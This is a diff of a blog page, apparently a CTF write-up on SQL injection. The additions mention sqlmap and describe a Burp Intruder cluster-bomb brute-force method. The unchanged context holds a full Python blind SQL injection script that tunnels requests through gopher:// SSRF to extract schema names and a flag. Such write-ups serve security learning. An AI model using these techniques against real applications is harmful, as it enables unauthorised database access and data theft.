@@ -26,6 +26,7 @@
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412122726143.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412123052991.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412123949128.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213012236141.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213013114976.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213013848916.png">
@@ -49,8 +50,13 @@
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410201414804.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230411013245234.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412103314980.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130046708.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130722783.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130832052.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130852364.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130941926.png">
 <meta property="article:published_time" content="2023-02-09T08:30:35.000Z">
-<meta property="article:modified_time" content="2023-04-12T04:39:54.629Z">
+<meta property="article:modified_time" content="2023-04-12T05:14:18.351Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Wed">
 <meta property="article:tag" content="sqli">
@@ -278,7 +284,7 @@
         
         
         
-          149 mins
+          152 mins
         
       </span>
     
@@ -364,6 +370,9 @@
 <p><img src="/2023/02/09/SQLI/image-20230412123052991.png" srcset="/img/loading.gif" lazyload></p>
 <p>表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下：</p>
 <p><img src="/2023/02/09/SQLI/image-20230412123949128.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然，要学会善于利用工具（，话不多说，上图</p>
+<p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>这道题用sqlmap也能直接淦出来。厚礼蟹</p>
 <hr>
 <h2 id="BUUCTF-EasySql"><a href="#BUUCTF-EasySql" class="headerlink" title="BUUCTF-EasySql"></a>BUUCTF-EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p>
 <p><img src="/2023/02/09/SQLI/image-20230213012236141.png" srcset="/img/loading.gif" lazyload></p>
@@ -537,6 +546,16 @@
 <p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>
 
+<p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p>
+<p>（感谢LinTu提供的思路）</p>
+<p><img src="/2023/02/09/SQLI/image-20230412130046708.png" srcset="/img/loading.gif" lazyload></p>
+<p>浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。</p>
+<p><img src="/2023/02/09/SQLI/image-20230412130722783.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130832052.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130852364.png" srcset="/img/loading.gif" lazyload></p>
+<p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p>
+<p><img src="/2023/02/09/SQLI/image-20230412130941926.png" srcset="/img/loading.gif" lazyload></p>
+<p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p>
 
                 
               </div>
